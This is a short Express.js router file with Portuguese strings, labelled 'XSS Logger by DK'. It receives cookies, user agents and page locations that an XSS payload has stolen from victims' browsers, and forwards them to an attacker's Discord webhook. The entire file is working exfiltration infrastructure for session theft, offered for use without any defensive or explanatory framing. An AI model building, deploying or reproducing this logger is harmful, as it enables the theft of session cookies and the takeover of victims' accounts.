const express = require('express');
const router = express.Router();
const axios = require('axios');

router.post('/log', async (req, res) => {
  const { cookie, user, location } = req.body;
  const webhook = process.env.WEBHOOK || 'COLE_SEU_WEBHOOK_AQUI';

  if (!cookie || !user || !location) {
    return res.status(400).json({ success: false, error: 'Dados incompletos' });
  }

  const embed = {
    title: "Novo Log XSS Capturado",
    color: 3066993,
    fields: [
      { name: "Cookie", value: `\`\`\`${cookie}\`\`\`` },
      { name: "User Agent", value: user },
      { name: "Localização", value: location }
    ],
    footer: { text: "XSS Logger by DK" }
  };

  try {
    await axios.post(webhook, { embeds: [embed] });
    res.json({ success: true });
  } catch (err) {
    await axios.post(webhook, {
      embeds: [{
        title: "Erro ao enviar log",
        description: err.message,
        color: 15158332
      }]
    });
    res.status(500).json({ success: false, error: 'Erro ao enviar para o Discord' });
  }
});

module.exports = router;
